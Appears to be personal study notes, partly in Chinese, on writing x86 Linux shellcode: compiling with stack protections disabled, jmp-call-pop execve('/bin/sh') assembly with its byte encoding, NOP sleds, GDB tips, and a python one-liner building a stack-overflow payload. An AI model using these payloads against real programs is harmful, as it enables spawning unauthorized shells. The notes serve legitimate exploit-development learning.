# shellcodes

Byte ordering
![image](https://slideplayer.com/slide/9303999/28/images/9/Byte+ordering+function+calls+%282%2F6%29.jpg)

## 16进制hex里面每个字符(0->f)都代表4个bit
32位有8个hex decimal (4*8=32bits)
64位有16个hex decimal (4*16=64bits)


# shellcode 

### compile 

```
gcc -m32 -fno-stack-protector -z execstack shellcode.c -o shellcode

nasm -f elf32 example.asm -o example.o

ld -m elf_i386 example.o

as --32 example.s -o example.o
```
- execstack: allow ....

### call from c
```
int (*foo)() = (int(*)())code;
  foo_value = foo();
```


```
// nasm 
global _start

section .text
_start:
    jmp short call_shellcode

shellcode:
    pop ebx                    ; address of '/bin/sh'
    xor eax,eax
    mov al, 11                 ; 0xb
    int 0x80

call_shellcode:
    call shellcode
    message db "/bin/sh"       ; no need to add \0 manually

/xeb/x07/x5b/x31/xc0/xb0/x0b/xcd/x80/xe8/xf4/xff/xff/xff/x2f/x62/x69/x6e/x2f/x73/x68

nasm -f elf32 example.asm -o example.o

ld -m elf_i386 example.o

./a.out

```


```
example2.asm (nasm)


global _start

section .text

_start:
	jmp getString

shell:
	xor eax, eax
	pop ebx
	xor ecx, ecx
	xor edx, edx
	mov al, 0xb
	int 0x80

getString:
	call shell
	db "/bin/sh"

```

## NOP(No operation performed)

```
\x90
a sled，雪橇，EIP跟着NOP往前（高地址）滑，可以当作shellcode前面的填充物。

```

## GDB 

```
x/wx 。。。 记得加个w代表word，32位，不然的话会打印nibbles
```

## print shellcode bytes 

```
Example
$(python -c 'print "\x90"*107 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "B"*4')

$(echo -n -e "\x31\xc0\x50\x68\x2f") 
$(echo -n -e "\x31\xc0\x50\x68\x2f") > inputFile  把inputFile里现有的内容删掉然后写入
$(echo -n -e "\x31\xc0\x50\x68\x2f") >> inputFile 在已有内容的后面添加
```
